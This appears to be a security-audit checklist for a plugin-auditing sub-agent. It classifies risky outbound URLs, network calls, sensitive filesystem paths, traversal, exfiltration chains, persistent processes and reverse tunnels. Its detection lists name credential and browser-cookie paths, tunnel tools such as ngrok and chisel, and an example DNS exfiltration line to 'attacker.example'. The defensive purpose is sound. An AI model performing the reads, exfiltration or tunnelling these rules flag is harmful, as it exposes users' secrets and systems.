# Network and Filesystem Patterns Checklist

Reference for the `auditor-network-fs` sub-agent. This agent focuses on what the project tries to reach — outwards (network) and inwards (filesystem) — independent of who declares it (manifests, configs, scripts, skills).

## Scope

Files to scan:

- All source files (any language).
- Shell scripts and Makefile targets.
- Skill bodies and agent prompts (for instructions that direct Claude to fetch URLs or read files outside the project).
- Configuration files referencing endpoints (CI/CD, Dockerfile, docker-compose, etc.).

The helper script `scripts/scan_network.sh` produces a starting list of URLs and domains; the agent then classifies each.

## What to look for

### 1. Outbound URL allowlist enforcement

Run the network scan helper. The output is a list of URLs grouped by host. For each host:

- On the standard allowlist (see `risk-model.md`) → `OK`.
- A well-known infrastructure host that does not appear on the allowlist but is clearly legitimate (e.g., `cloudflare.com`, `microsoft.com`, `apple.com`) → `CAUTION` (worth a human glance).
- An obscure host: a long random subdomain, a numeric IP, a dynamic-DNS provider (`*.duckdns.org`, `*.no-ip.com`, `*.ngrok.io`, `*.serveo.net`) → `FAIL`.
- A URL shortener (`bit.ly`, `t.co`, `goo.gl`, `tinyurl.com`) → `FAIL` (destination cannot be vetted statically).

### 2. Network call libraries

For each call to common HTTP clients — Python (`requests`, `urllib`, `httpx`, `http.client`, `aiohttp`), Node (`axios`, `node-fetch`, `got`, the global `fetch`), shell (`curl`, `wget`), PowerShell (`Invoke-WebRequest`):

- The URL is hardcoded → severity follows the host classification above.
- The URL is constructed from input (template strings over arguments, f-strings over variables) → `CAUTION` minimum.
- The call result is fed into a shell or a code interpreter (any process-spawn helper, runtime evaluation) → `FAIL`.
- TLS verification disabled (`verify=False`, `rejectUnauthorized: false`, `--insecure`) → `CAUTION`.
- Custom CA bundle bundled in the repo → `CAUTION` (provenance check needed).

### 3. Filesystem scope

Grep all source files and skill bodies for paths matching:

- Absolute paths outside the project that are not OS standard locations (`/usr/local/`, `/etc/profile.d/`, `/opt/`) → `CAUTION`.
- `~/.ssh/`, `~/.aws/`, `~/.azure/`, `~/.config/gcloud/`, `~/.kube/`, `~/.netrc`, `~/.pgpass` → `FAIL`.
- `~/.config/gh/`, `~/.gitconfig` → `CAUTION` (read) or `FAIL` (write).
- `~/.claude/` paths other than `~/.claude/plugin-auditor-reports/` → `FAIL`.
- Browser-state paths (`~/Library/Application Support/Google/Chrome/`, `~/.mozilla/`, `~/.config/google-chrome/`) → `FAIL` (cookie/credential theft surface).

### 4. Path traversal

Grep for:

- Hardcoded `../../../`, `../../`, `../` in arguments to file-read or file-write functions.
- Path joins where the second component comes from input without sanitisation.
- Glob patterns reaching outside the project (`/**/*` rooted at `/`, `~/**/*`).

Hardcoded traversal outside the project root is `FAIL`. Input-based traversal (without sanitisation) is `CAUTION` to `FAIL` depending on whether the input is attacker-controlled.

### 5. Data exfiltration chains

A finding is escalated when read + send patterns coexist in the same script or module:

- Read of a sensitive file (any path from #3) → write/transmit of that content to network → `FAIL` (active exfiltration).
- Read of process environment (`process.env`, `os.environ` and equivalents) → outbound HTTP request that includes those values → `FAIL`.
- Read of git history or `.git/config` → outbound transmission → `FAIL`.

### 6. Long-running and persistent processes

- `nohup`, `setsid`, `disown` invocations → `CAUTION`.
- Trailing `&` outside a clearly developer-only context (e.g., dev server) → `CAUTION`.
- `screen -dmS`, `tmux new-session -d` → `CAUTION`.
- Spawning a process that listens on a network port without documentation → `FAIL`.

### 7. DNS-based exfiltration

- DNS queries constructed from data (e.g., `dig <data>.attacker.example`) → `FAIL`.
- TXT record lookups against non-standard hosts → `CAUTION`.

### 8. Web sockets / persistent connections

- Outgoing WebSocket to a non-allowlisted host → `CAUTION`.
- Long-poll or SSE connection to a non-allowlisted host → `CAUTION`.
- Reverse-tunnel tools (`ssh -R`, `ngrok`, `frp`, `chisel`) → `FAIL`.

### 9. Telemetry

- Telemetry that is on by default (no opt-in) and sends free-form text or environment data → `CAUTION`.
- Telemetry endpoint not on the allowlist → `CAUTION`.
- Telemetry that includes anything matching the secret regex catalogue → `FAIL`.

## Output format

```markdown
### FAIL
- `<path>:<line>` — <description>
  > <quoted excerpt>

### CAUTION
- `<path>:<line>` — <description>
  > <quoted excerpt>

### OK
- All outbound URLs are on the standard allowlist
- No reads of ~/.ssh, ~/.aws, ~/.azure, ~/.kube, ~/.netrc, browser state
- No path traversal patterns
- No read+send exfiltration chains
- No persistent processes spawned silently
- No DNS-based exfiltration patterns
- No reverse-tunnel tools invoked
- Telemetry (if present) is opt-in and points at allowlisted hosts
```
